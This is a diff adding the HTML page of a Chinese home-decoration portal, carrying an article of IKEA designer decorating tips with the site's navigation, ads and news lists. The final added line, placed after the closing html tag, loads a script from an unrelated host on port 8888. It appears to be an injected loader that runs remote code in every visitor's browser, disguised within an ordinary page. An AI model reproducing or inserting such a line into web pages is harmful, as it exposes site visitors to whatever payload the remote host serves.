@@ -1,0 +1,287 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<HTML xmlns="http://www.w3.org/1999/xhtml">
+<HEAD>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>装饰装修网</title>
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<meta name="keywords" content="装饰装修网" />
+<meta name="description" content="装饰装修网" />
+<link href="/css/head1.css" rel="stylesheet" type="text/css" />
+<link href="/css/index1.css" rel="stylesheet" type="text/css" />
+<script src="/js/jquery-1.4a2.min.js" type="text/javascript"></script>
+<script src="/js/jquery.KinSlideshow-1.2.1.min.js" type="text/javascript"></script>
+<style type="text/css">
+* {margin:0; padding:0;}
+.clearfix:after {content: "."; display: block; height: 0; clear: both; visibility: hidden;}
+.clearfix {zoom:1;}
+ul,li {list-style:none;}
+img {border:0;}
+.wrapper {width:960px; margin:0 auto;margin-bottom:5px }
+.shuoming {margin-top:20px; border:1px solid #ccc; padding-bottom:10px;}
+.shuoming dt {height:30px; line-height:30px; font-weight:bold; text-indent:10px;}
+.shuoming dd {line-height:20px; padding:5px 20px;}
+/* qqshop focus */
+#focus {width:960px; height:280px; overflow:hidden; position:relative;}
+#focus ul {height:380px; position:absolute;}
+#focus ul li {float:left; width:960px; height:280px; overflow:hidden; position:relative; background:#000;}
+#focus ul li img{width:960px}
+#focus ul li div {position:absolute; overflow:hidden;}
+#focus .btnBg {position:absolute; width:800px; height:20px; left:0; bottom:0; background:#000;}
+#focus .btn {position:absolute; width:780px; height:10px; padding:5px 10px; right:0; bottom:0; text-align:right;}
+#focus .btn span {display:inline-block; _display:inline; _zoom:1; width:25px; height:10px; _font-size:0; margin-left:5px; cursor:pointer; background:#fff;}
+#focus .btn span.on {background:#fff;}
+#focus .preNext {width:45px; height:100px; position:absolute; top:90px; background:url(images/sprite.png) no-repeat 0 0; cursor:pointer;}
+#focus .pre {left:0;}
+#focus .next {right:0; background-position:right top;}
+.menu { width: 960px; height:38px; float:left; background: url(../images/main.png) no-repeat 0px -35px;}
+.menu ul { width: 960px; float:left; text-align:center;line-height:38px;}
+.menu ul li { width: 80px; float:left; padding-right:6px;font-size:14px; font-weight:bold; color:#FFF; background: url(../images/menu_r.jpg) no-repeat right center;}
+.menu ul li a{ display:block; color: #FFFFFF; text-decoration:none; font-size:14px;}
+.menu ul li a:hover{ width: 80px; float:left; font-weight:bold; color:#FFF; background: url(../images/menu_a.jpg) no-repeat center center;}
+</style>
+<script type="text/javascript">
+$(function() {
+var sWidth = $("#focus").width(); //获取焦点图的宽度（显示面积）
+var len = $("#focus ul li").length; //获取焦点图个数
+var index = 0;
+var picTimer;
+//以下代码添加数字按钮和按钮后的半透明条，还有上一页、下一页两个按钮
+var btn = "<div class='btnBg'></div><div class='btn'>";
+for(var i=0; i < len; i++) {
+btn += "<span></span>";
+}
+btn += "</div><div class='preNext pre'></div><div class='preNext next'></div>";
+$("#focus").append(btn);
+$("#focus .btnBg").css("opacity",0.5);
+//为小按钮添加鼠标滑入事件，以显示相应的内容
+$("#focus .btn span").css("opacity",0.4).mouseenter(function() {
+index = $("#focus .btn span").index(this);
+showPics(index);
+}).eq(0).trigger("mouseenter");
+//上一页、下一页按钮透明度处理
+$("#focus .preNext").css("opacity",0.2).hover(function() {
+$(this).stop(true,false).animate({"opacity":"0.5"},300);
+},function() {
+$(this).stop(true,false).animate({"opacity":"0.2"},300);
+});
+//上一页按钮
+$("#focus .pre").click(function() {
+index -= 1;
+if(index == -1) {index = len - 1;}
+showPics(index);
+});
+//下一页按钮
+$("#focus .next").click(function() {
+index += 1;
+if(index == len) {index = 0;}
+showPics(index);
+});
+//本例为左右滚动，即所有li元素都是在同一排向左浮动，所以这里需要计算出外围ul元素的宽度
+$("#focus ul").css("width",sWidth * (len));
+//鼠标滑上焦点图时停止自动播放，滑出时开始自动播放
+$("#focus").hover(function() {
+clearInterval(picTimer);
+},function() {
+picTimer = setInterval(function() {
+showPics(index);
+index++;
+if(index == len) {index = 0;}
+},4000); //此4000代表自动播放的间隔，单位：毫秒
+}).trigger("mouseleave");
+//显示图片函数，根据接收的index值显示相应的内容
+function showPics(index) { //普通切换
+var nowLeft = -index*sWidth; //根据index值计算ul元素的left值
+$("#focus ul").stop(true,false).animate({"left":nowLeft},300); //通过animate()调整ul元素滚动到计算出的position
+//$("#focus .btn span").removeClass("on").eq(index).addClass("on"); //为当前的按钮切换到选中的效果
+$("#focus .btn span").stop(true,false).animate({"opacity":"0.4"},300).eq(index).stop(true,false).animate({"opacity":"1"},300); //为当前的按钮切换到选中的效果
+}
+});
+</script>
+<script type="text/javascript">
+$(function(){
+$("#KinSlideshow").KinSlideshow();
+})
+</script>
+<style type="text/css">
+.code {
+height:auto;
+padding:20px;
+border:1px solid #9EC9FE;
+background:#ECF3FD;
+}
+.code pre {
+font-family:"Courier New";
+font-size:14px;
+}
+.info {
+font-size:12px;
+color:#666666;
+font-family:Verdana;
+margin:20px 0 50px 0;
+}
+.info p {
+margin:0;
+padding:0;
+line-height:22px;
+text-indent:40px;
+}
+h2.title {
+margin:0;
+padding:0;
+margin-top:50px;
+font-size:18px;
+font-family:"微软雅黑", Verdana;
+}
+h3.title {
+font-size:16px;
+font-family:"微软雅黑", Verdana;
+}
+.importInfo {
+font-family:Verdana;
+font-size:14px;
+}
+</style>
+<style type="text/css">
+.zz {
+display:none !important
+}
+</style>
+<link href="/css/list.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div id="conter">
+<div id="top">
+<div style="float:left;">欢迎光临<font color="red">装修装饰网</font>!</div>
+<div style="float:right;"><a onClick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://'+location.hostname+(location.port!=''?':':'')+location.port);" href="#">设为首页</a> | <a href="#" onClick="javascript:window.external.addFavorite('http://'+location.hostname+(location.port!=''?':':'')+location.port,'装饰装修网');">加入收藏</a> | <a href="/member,register.aspx">注册</a> | <a href="/member,login.aspx">登录</a></div>
+</Div>
+<div id="header">
+<div id="logo">
+<div style="float:left; display:inline; margin-left:20px; margin-top:10px;"><a href="/" onFocus="if(this.blur)this.blur()"><img src="images/logo.jpg" alt="装修装饰网" border="0" /></a></div>
+<div style="float:right; display:inline;margin-top:10px;">
+<script type="text/javascript">alimama_bm_revision = "20120313";alimama_bm_bid = "29508089";alimama_bm_width = 640;alimama_bm_height = 80;alimama_bm_xmlsrc = "http://img.uu1001.cn/x3/2012-04-16/11-11/2012-04-16_0c1fc9280b59224ead831037204b6a9e_3.xml";alimama_bm_link = "http%3A%2F%2F";alimama_bm_ds = "";alimama_bm_as = "default"</script><script type="text/javascript" src="http://img.uu1001.cn/bmv3.js?v=20120313"></script>
+</div>
+</div>
+<div class="wrapper">
+<div id="focus">
+<ul>
+<li><a href="http://www.zszx88.com/member/1202829983/" title="聚信美" target="_blank"><img src="/130504100054988098800000.jpg" alt="聚信美" width="960px" height="336px" /></a></li><li><a href="http://www.zszx88.com/member/1202829983/" title="凤凰宫" target="_blank"><img src="/130504100033985098500000.jpg" alt="凤凰宫" width="960px" height="336px" /></a></li><li><a href="http://www.zszx88.com/member/1255935840/" title="红心美凯龙" target="_blank"><img src="/130330174050867086700000.jpg" alt="红心美凯龙" width="960px" height="336px" /></a></li><li><a href="http://www.toto.com.cn/" title="聚信美" target="_blank"><img src="/151123011152050805087500.jpg" alt="聚信美" width="960px" height="336px" /></a></li><li><a href="http://www.arrowceramic.com/" title="箭牌瓷砖" target="_blank"><img src="/151120134633316531650000.jpg" alt="箭牌瓷砖" width="960px" height="336px" /></a></li>
+</ul>
+</div>
+</div>
+<div class="menu">
+<ul>
+<li><a href="/" class="actived" style="color: #fff">首 页</a></li>
+<li><a href="/news,index.aspx" target="_self" style="color: #fff" >行业资讯</a></li>
+<li><a href="/zxal,index.aspx" target="_self" style="color: #fff">装修案例</a></li>
+<li><a href="/zxjc,list.aspx" target="_self" style="color: #fff">装修建材</a></li>
+<li><a href="/lszx,list.aspx" target="_self" style="color: #fff">楼市资讯</a></li>
+<li><a href="/jjsp,list.aspx" target="_self" style="color: #fff">家居饰品</a></li>
+<li><a href="/mjsj,list.aspx" target="_self" style="color: #fff">名家设计</a></li>
+<li><a href="/zxzs,index.aspx" target="_self" style="color: #fff">装修知识</a></li>
+<li><a href="/zxtk,index.aspx" target="_self" style="color: #fff">装修图库</a></li>
+<li><a href="/groupbuy,list.aspx" target="_self" style="color: #fff">团购信息</a></li>
+<li><a href="/member,list.aspx" target="_self" style="color: #fff">企业中心</a></li>
+</ul>
+</div>
+<a href="http://www.zszx88.com/news,u1280936714,c1712742794,i1201432955,detail.aspx" title="导航下广告" target="_blank"><img style="margin-top:5px" src="/151124115351480048000000.png" alt="导航下广告" width="960px" /></a>
+<div id="search">
+<form  name="formsearch" action="">
+<span style="float:left;padding:6px 0 0 35px;">
+<input name="q" type="text" style="border:0px;width:130px;height:13px;" id="search-keyword" value="在这里搜索..." onFocus="if(this.value=='在这里搜索...'){this.value='';}"  onblur="if(this.value==''){this.value='在这里搜索...';}" />
+</span><span style="float:left;padding:2px 0 0 20px;">
+<select name="searchtype" style="height:23px;" id="search-option">
+<option value="title" selected='1'>搜索</option>
+</select>
+</span><span style="float:left;padding:2px 0 0 5px;line-height:22px;">
+<input name="" type="submit" value="查 询" class="submitss" onClick="opensoso1()"/>
+</span>
+</form>
+<span style="float:right;line-height:27px;"><font color="#fe5b27"><strong style="font-size:14px;">热点推荐：</strong></font>
+<marquee style="width:320px;" direction="left" scrollamount=1 scrolldelay=10 id="myMarquee" onstart="this.start=1;this.scrollAmount=this.offsetWidth-70" onscroll="if(this.start>1){this.scrollAmount=1;this.onstart=null;this.onscroll=null;}this.start++;">
+<a href="news,u1280936714,c1682095870,i1201441786,detail.aspx" target="_blank" title="公积金提取条件放宽 家庭装修或可使用">公积金提取条件放宽 家庭装修或可使用</a><a href="news,u1280936714,c1682095870,i1201441784,detail.aspx" target="_blank" title="国家抽检：北京木制家具不合格率居首">国家抽检：北京木制家具不合格率居首</a><a href="news,u1280936714,c1682095870,i1201441778,detail.aspx" target="_blank" title="红星美凯龙战略扩张 将与2000家地产商合作">红星美凯龙战略扩张 将与2000家地产商合作</a><a href="news,u1280936714,c1682095870,i1201441734,detail.aspx" target="_blank" title="你信0元装修/分年返还装修款吗？没有免费午餐！">你信0元装修/分年返还装修款吗？没有免费午餐！</a><a href="news,u1280936714,c1682095870,i1201441731,detail.aspx" target="_blank" title="潜伏在家居环境中的过敏原 严重时甚至会危及生命">潜伏在家居环境中的过敏原 严重时甚至会危及生命</a><a href="news,u1280936714,c1682095870,i1201441728,detail.aspx" target="_blank" title="智能马桶真的好用吗？装修网谈挑选智能马桶那点事">智能马桶真的好用吗？装修网谈挑选智能马桶那点事</a><a href="news,u1280936714,c1682095870,i1201441726,detail.aspx" target="_blank" title="冬季装修有弊端 七种注意事项助你家装一臂之力">冬季装修有弊端 七种注意事项助你家装一臂之力</a><a href="news,u1280936714,c1682095870,i1201441723,detail.aspx" target="_blank" title="无气味就是环保的?装修菜鸟DIY刷墙十大常见误区">无气味就是环保的?装修菜鸟DIY刷墙十大常见误区</a><a href="news,u1280936714,c1712742794,i1201432955,detail.aspx" target="_blank" title="祥吉装饰6周年庆典成功举行，大奖等你来领取！">祥吉装饰6周年庆典成功举行，大奖等你来领取！</a><a href="news,u1006230803,c1706836190,i1000761961,detail.aspx" target="_blank" title="创新与升级 深圳家具展加速“差异化”前行">创新与升级 深圳家具展加速“差异化”前行</a><a href="news,u1006230803,c1706836190,i1000761960,detail.aspx" target="_blank" title="第七届欧亚国际酒店用品博览会下周开幕">第七届欧亚国际酒店用品博览会下周开幕</a><a href="news,u1006230803,c1706836190,i1000761959,detail.aspx" target="_blank" title="蔡沐希:打造完美的装饰“艺术品”(图)">蔡沐希:打造完美的装饰“艺术品”(图)</a><a href="news,u1006230803,c1706836190,i1000761958,detail.aspx" target="_blank" title="百度齐家共推家装建材电子商务解决方案">百度齐家共推家装建材电子商务解决方案</a><a href="news,u1006230803,c1706836190,i1000761957,detail.aspx" target="_blank" title="贵阳五星高端酒店风起云涌 个个争做高富帅">贵阳五星高端酒店风起云涌 个个争做高富帅</a><a href="news,u1006230803,c1706836190,i1000761956,detail.aspx" target="_blank" title="小小彩色气球成就80后女孩创业梦想">小小彩色气球成就80后女孩创业梦想</a><a href="news,u1006230803,c1706836190,i1000761955,detail.aspx" target="_blank" title="制衣设备展览会于7月首次在深圳服交会上举行">制衣设备展览会于7月首次在深圳服交会上举行</a><a href="news,u1006230803,c1706836190,i1000761954,detail.aspx" target="_blank" title="古格杨德华:折扣加盟打破现场零签约(图)">古格杨德华:折扣加盟打破现场零签约(图)</a><a href="news,u1006230803,c1706836190,i1000761953,detail.aspx" target="_blank" title="摘星再追星 东莞首家五星酒店银城之痛">摘星再追星 东莞首家五星酒店银城之痛</a><a href="news,u1006230803,c1706836190,i1000761952,detail.aspx" target="_blank" title="顾家家居俞宇炜:让消费者拥有幸福感">顾家家居俞宇炜:让消费者拥有幸福感</a><a href="news,u1006230803,c1706836190,i1000761951,detail.aspx" target="_blank" title="慧聪电子网鸡毛信2012年4月10日展会特刊">慧聪电子网鸡毛信2012年4月10日展会特刊</a>    </marquee>
+</span></div>
+</div>
+</div>
+<div class="main">
+<div class="listleft" style="height:auto; background:none repeat scroll 0 0 #F6F6F6">
+<table height="670" cellspacing="0" cellpadding="0" border="0" width="690" class="tb3"><tbody><tr><td height="668" align="center" valign="top"><table height="40" cellspacing="0" cellpadding="0" border="0" width="96%" style="border-bottom:1px #999999 dashed; "><tbody><tr><td height="39" align="center" valign="middle"><span class="title"><h1>宜家设计师揭晓10大家居装修诀窍[图文]</h1></span></td></tr></tbody></table><table height="10" cellspacing="0" cellpadding="0" border="0" width="80%"><tbody><tr><td /></tr></tbody></table><table height="27" cellspacing="0" cellpadding="0" border="0" width="96%" class="info2"><tbody><tr align="left" style="background:#FFFFCC"><td width="21%" style="padding-left:8px " class="heigh1">来源：网络</td><td width="25%" valign="middle" class="heigh1">编辑者：超级管理员</td><td width="21%" valign="middle" class="heigh1">                        浏览：234  次                      </td><td width="27%" valign="middle" class="heigh1">发布：2009-06-23</td></tr></tbody></table><table height="10" cellspacing="0" cellpadding="0" border="0" width="80%"><tbody><tr><td /></tr></tbody></table><table height="31" cellspacing="0" cellpadding="0" border="0" width="96%"><tbody><tr><td height="31" align="left" valign="top" class="show"><div id="artical"><P>&nbsp;&nbsp;&nbsp;&nbsp;<STRONG>【</STRONG><STRONG>慧聪家居用品网</STRONG><STRONG>】</STRONG>宜家从进入中国市场以来，因其设计精良，功能齐全，价格低廉的家居用品受到了年轻人的喜爱。如何经济实惠地装出时尚之家，成了大部分业主们首先考虑的问题。用宜家设计师MIA的话说，家是人们放松、工作和玩耍的地方，在家居布置过程中，最重要的是有勇气根据自己的生活方式而不是惯例来规划自己的家。“让你的家展现你的风格和生活方式，这样才能设计出满意的家。”设计师MIA介绍了10大装修小诀窍:&nbsp;    <P align=center><IMG style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" alt=宜家设计师揭晓10大家居装修诀窍 src="http://img.hc360.com/home/info/images/200906/200906220307176487.jpg" border=0></P>   <P style="FONT-SIZE: 12px" align=center>宜家设计师揭晓10大家居装修诀窍</P>   <P align=center></P>   <P align=center>&nbsp;&nbsp;&nbsp;</P>   <P>&nbsp;&nbsp;&nbsp;&nbsp;诀窍一：这里或那里，出位一些也无妨。混搭颜色和图案根本不用遵循常规。    <P><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG><STRONG>点击家居用品网，查看更多</STRONG></P>   <P></P>   <P><STRONG>家居软装&nbsp; 家居流行&nbsp; 装修样板　沙发布艺&nbsp; 床上用品</STRONG>&nbsp; <STRONG target="_blank">卧室风水</STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></STRONG></P>   <P align=center><IMG alt=家居首页 src="http://img.hc360.com/home/info/images/200808/200808011640584332.gif" border=0 twffan="done">&nbsp;&nbsp;&nbsp;&nbsp;</P>   </div>  <div id="artical">&nbsp;</P>   <P align=center><IMG style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" alt=宜家设计师揭晓10大家居装修诀窍 src="http://img.hc360.com/home/info/images/200906/200906220307176118.jpg" border=0></P>   <P style="FONT-SIZE: 12px" align=center>宜家设计师揭晓10大家居装修诀窍</P>   <P align=center></P>   <P>&nbsp;&nbsp;&nbsp;&nbsp;诀窍二：从灯光、宁静的背景开始。根据您的喜好用窗帘、沙发套，一次性的椅子添加颜色，这种方式既容易又便宜，而且易于改变。    </div>  <div id="artical">    <P align=center><IMG style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" alt=宜家设计师揭晓10大家居装修诀窍 src="http://img.hc360.com/home/info/images/200906/200906220307184708.jpg" border=0></P>   <P style="FONT-SIZE: 12px" align=center>宜家设计师揭晓10大家居装修诀窍</P>   <P align=center></P>   <P>&nbsp;&nbsp;&nbsp;&nbsp;诀窍三：树立你自己的原则，如果你希望将自己最喜欢的椅子放在厨房，那就把它放在厨房。    </div>  <div id="artical">    <P align=center><IMG style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" alt=宜家设计师揭晓10大家居装修诀窍 src="http://img.hc360.com/home/info/images/200906/200906220307183676.jpg" border=0></P>   <P style="FONT-SIZE: 12px" align=center>宜家设计师揭晓10大家居装修诀窍</P>   <P align=center></P>   <P>&nbsp;&nbsp;&nbsp;&nbsp;诀窍四：避免凌乱。将你收集的最喜欢的苏打汽酒瓶组合在一起比凌乱在四处好看很多。    </div>  <div id="artical">    <P align=center><IMG style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" alt=宜家设计师揭晓10大家居装修诀窍 src="http://img.hc360.com/home/info/images/200906/200906220307559144.jpg" border=0></P>   <P style="FONT-SIZE: 12px" align=center>宜家设计师揭晓10大家居装修诀窍</P>   <P align=center></P>   <P>&nbsp;&nbsp;&nbsp;&nbsp;诀窍五：给每样东西一个自己的空间，包括很多非常重要的东西(比如你收集的鞋子)，扔掉你不喜欢和不用的东西。    </div>  <div id="artical">    <P align=center><IMG style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" alt=宜家设计师揭晓10大家居装修诀窍 src="http://img.hc360.com/home/info/images/200906/200906220307555912.jpg" border=0></P>   <P style="FONT-SIZE: 12px" align=center>宜家设计师揭晓10大家居装修诀窍</P>   <P align=center></P>   <P>&nbsp;&nbsp;&nbsp;&nbsp;诀窍六：担心你沙发上的污渍吗?选择可以更换和清洗的沙发套。当你希望有不同外观的时候还可以轻松更换。    </div>  <div id="artical">    <P align=center><IMG style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" alt=宜家设计师揭晓10大家居装修诀窍 src="http://img.hc360.com/home/info/images/200906/200906220307561658.jpg" border=0></P>   <P style="FONT-SIZE: 12px" align=center>宜家设计师揭晓10大家居装修诀窍</P>   <P align=center></P>   <P>&nbsp;&nbsp;&nbsp;&nbsp;诀窍七：让孩子加入进来，他们希望和你在一起。而且他们需要的东西可以很容易地取得，他们就可以在家务杂食上给你帮点忙。</P>   </div>  <div id="artical"></P>   <P align=center><IMG style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" alt=宜家设计师揭晓10大家居装修诀窍 src="http://img.hc360.com/home/info/images/200906/200906220307568714.jpg" border=0></P>   <P style="FONT-SIZE: 12px" align=center>宜家设计师揭晓10大家居装修诀窍</P>   <P align=center></P>   <P>&nbsp;&nbsp;&nbsp;&nbsp;诀窍八：希望你的厨房变个样子吗?将几个橱柜的柜门和抽屉前板换成当季颜色。    </div>  <div id="artical">    <P align=center><IMG style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" alt=宜家设计师揭晓10大家居装修诀窍 src="http://img.hc360.com/home/info/images/200906/200906220307561038.jpg" border=0></P>   <P style="FONT-SIZE: 12px" align=center>宜家设计师揭晓10大家居装修诀窍</P>   <P align=center></P>   <P>&nbsp;&nbsp;&nbsp;&nbsp;诀窍九：灵活地移动。附脚轮家具能移动到你需要的任何地方，而且也会使清洁变得很容易。    </div></td></tr></tbody></table><table height="10" cellspacing="0" cellpadding="0" border="0" width="80%"><tbody><tr><td /></tr></tbody></table></td></tr></tbody></table>
+</div>
+<div class="listright">
+<div class="ad">
+<img src="/images/ad1.jpg"  width="244"/>
+<img src="/images/ad2.jpg"  width="244"/>
+<img src="/images/ad3.jpg"  width="244"/>
+</div>
+<div class="newstt">
+<div class="newstt_1">
+<h1 class="l">
+<span>行业资讯</span>
+</h1>
+<em class="r">
+<a target="_blank" href="/news,index.aspx">更多&gt;&gt;</a>
+</em>
+</div>
+<div class="newstt_2">
+<ul>
+<li><a href="news,u1280936714,c1682095870,i1201441786,detail.aspx" title="公积金提取条件放宽 家庭装修...">公积金提取条件放宽 家庭装修...</a></li><li><a href="news,u1280936714,c1682095870,i1201441784,detail.aspx" title="国家抽检：北京木制家具不合格...">国家抽检：北京木制家具不合格...</a></li><li><a href="news,u1280936714,c1682095870,i1201441778,detail.aspx" title="红星美凯龙战略扩张 将与2000...">红星美凯龙战略扩张 将与2000...</a></li><li><a href="news,u1280936714,c1682095870,i1201441734,detail.aspx" title="你信0元装修/分年返还装修款吗...">你信0元装修/分年返还装修款吗...</a></li><li><a href="news,u1280936714,c1682095870,i1201441731,detail.aspx" title="潜伏在家居环境中的过敏原 严...">潜伏在家居环境中的过敏原 严...</a></li><li><a href="news,u1280936714,c1682095870,i1201441728,detail.aspx" title="智能马桶真的好用吗？装修网谈...">智能马桶真的好用吗？装修网谈...</a></li><li><a href="news,u1280936714,c1682095870,i1201441726,detail.aspx" title="冬季装修有弊端 七种注意事项...">冬季装修有弊端 七种注意事项...</a></li><li><a href="news,u1280936714,c1682095870,i1201441723,detail.aspx" title="无气味就是环保的?装修菜鸟DIY...">无气味就是环保的?装修菜鸟DIY...</a></li><li><a href="news,u1280936714,c1712742794,i1201432955,detail.aspx" title="祥吉装饰6周年庆典成功举行，大...">祥吉装饰6周年庆典成功举行，大...</a></li><li><a href="news,u1006230803,c1706836190,i1000761961,detail.aspx" title="创新与升级 深圳家具展加速“...">创新与升级 深圳家具展加速“...</a></li><li><a href="news,u1006230803,c1706836190,i1000761960,detail.aspx" title="第七届欧亚国际酒店用品博览会...">第七届欧亚国际酒店用品博览会...</a></li><li><a href="news,u1006230803,c1706836190,i1000761959,detail.aspx" title="蔡沐希:打造完美的装饰“艺术品...">蔡沐希:打造完美的装饰“艺术品...</a></li>
+</ul>
+</div>
+</div>
+<div class="newstt">
+<div class="newstt_1">
+<h1 class="l">
+<span>热门知识</span>
+</h1>
+<em class="r">
+<a target="_blank" href="/zxzs,index.aspx">更多&gt;&gt;</a>
+</em>
+</div>
+<div class="newstt_2">
+<ul>
+<li><a href="zxzs,u1280936714,c1923742083,i1000583389,detail.aspx" title="门窗企业转型升级 渠道和市场...">门窗企业转型升级 渠道和市场...</a></li><li><a href="zxzs,u1280936714,c1955449280,i1000583063,detail.aspx" title="厨房装修五大风水禁忌 不可不...">厨房装修五大风水禁忌 不可不...</a></li><li><a href="zxzs,u0,c1990664628,i1000582808,detail.aspx" title="箭牌漆全面推广仿花岗岩建筑涂...">箭牌漆全面推广仿花岗岩建筑涂...</a></li><li><a href="zxzs,u0,c1665200657,i1000581660,detail.aspx" title="2012新气象 家装风水不可忽略...">2012新气象 家装风水不可忽略...</a></li><li><a href="zxzs,u0,c1491657340,i1000579165,detail.aspx" title="冬季装修指南:主墙面材质设计全...">冬季装修指南:主墙面材质设计全...</a></li><li><a href="zxzs,u0,c1491657340,i1000578387,detail.aspx" title="装修知识:家庭节能装修选用材料...">装修知识:家庭节能装修选用材料...</a></li><li><a href="zxzs,u1006230803,c1374246402,i1000577559,detail.aspx" title="卫生间防水接闭水，一波三折瓷...">卫生间防水接闭水，一波三折瓷...</a></li><li><a href="zxzs,u0,c1990664628,i1000577143,detail.aspx" title="环保问题已成为陶瓷卫浴业的技...">环保问题已成为陶瓷卫浴业的技...</a></li><li><a href="zxzs,u0,c1028458884,i1000575540,detail.aspx" title="从罗莱家纺B2C失利 看家纺企业...">从罗莱家纺B2C失利 看家纺企业...</a></li><li><a href="zxzs,u0,c1140473440,i1000572795,detail.aspx" title="细腻设计 阿贝尼威尼斯橱柜浪...">细腻设计 阿贝尼威尼斯橱柜浪...</a></li><li><a href="zxzs,u0,c1142720570,i1000570263,detail.aspx" title="厨房电器市场套装与组合或引领...">厨房电器市场套装与组合或引领...</a></li><li><a href="zxzs,u0,c1547747400,i1000570100,detail.aspx" title="家装保养小常识:厨房电器美容保...">家装保养小常识:厨房电器美容保...</a></li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div style="clear:both"></div>
+<div class="footer w960 center mt1 clear" style="margin:0px auto; border:1px solid #ccc;width:938px;margin-top:10px;padding:10px">
+<div class="footer_body">
+<p class="powered"><a href="/about,u1280936714,c1113409720,i1000876830,detail.aspx"  target="_blank">关于我们</a> | <a href="/about,u1006230803,c1654466527,i1000848047,detail.aspx"  target="_blank">联系方式<a/> | <a href="/about,u1006230803,c1052992650,i1000848054,detail.aspx"  target="_blank">付款方式<a/> | <a href="/about,u1006230803,c1141941236,i1000848052,detail.aspx" title="" target="_blank">会员须知</a> | <a href="/about,u1006230803,c1413430620,i1000848050,detail.aspx"  target="_blank">广告服务</a> | <a href="/about,u1006230803,c1615922540,i1000848048,detail.aspx"  target="_blank">免责声明<a/> | <a href="/about,u1006230803,c1259634960,i1000848051,detail.aspx"  target="_blank">帮助中心<a/><br/>
+<div class="copyright"> 蜀ICP备12011891号-1  &nbsp;&nbsp;联系电话：023-88165668<br/>
+Copyright &copy; 2012  版权所有 &nbsp;&nbsp;
+<br />当前访问量：<font color="red"><script type="text/javascript" src="/js/websitestatistics/count/1226209120/117642"></script></font>人次
+<br />
+</p>
+</div>
+</div>
+</div>
+<LINK rel=stylesheet type=text/css href="css/common1.css">
+<SCRIPT type=text/javascript src="js/kefu.js"></SCRIPT>
+<DIV id=floatTools class=float0831>
+<DIV class=floatL><A style="DISPLAY: none" id=aFloatTools_Show class=btnOpen
+title=查看在线客服
+onclick="javascript:$('#divFloatToolsView').animate({width: 'show', opacity: 'show'}, 'normal',function(){ $('#divFloatToolsView').show();kf_setCookie('RightFloatShown', 0, '', '/', 'www.istudy.com.cn'); });$('#aFloatTools_Show').attr('style','display:none');$('#aFloatTools_Hide').attr('style','display:block');"
+href="javascript:void(0);">展开</A><A id=aFloatTools_Hide class=btnCtn
+title=关闭在线客服
+onclick="javascript:$('#divFloatToolsView').animate({width: 'hide', opacity: 'hide'}, 'normal',function(){ $('#divFloatToolsView').hide();kf_setCookie('RightFloatShown', 1, '', '/', 'www.istudy.com.cn'); });$('#aFloatTools_Show').attr('style','display:block');$('#aFloatTools_Hide').attr('style','display:none');"
+href="javascript:void(0);">收缩</A></DIV>
+<DIV id=divFloatToolsView class=floatR>
+<DIV class=tp></DIV>
+<DIV class=cn>
+<UL>
+<LI class=top>
+<H3 class=titZx>QQ咨询</H3>
+</LI>
+<LI><SPAN class=icoZx>在线咨询</SPAN></LI>
+<LI><A class=icoTc href="http://wpa.qq.com/msgrd?v=3&uin=2289965712&site=qq&menu=yes">设计部</A></LI>
+<LI class=bot><A class=icoTc href="http://wpa.qq.com/msgrd?v=3&uin=2892398605&site=qq&menu=yes">网络部</A></LI>
+</UL>
+</DIV>
+</DIV>
+</DIV>
+<!-- 内存缓存:D:/wwwroot/html/zxzsw.iwanshang.com/news/detail/1000468896.html#w=zxzsw.iwanshang.com#v=cn#m=news#u=1280936714#c=1955449280#i=1000468896http://www.xjzs88.com/news,u1280936714,c1955449280,i1000468896,detail.aspx -->
+<script type="text/javascript" src="/js/main.default.framework.js"></script>
+</body>
+</html>
+<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>
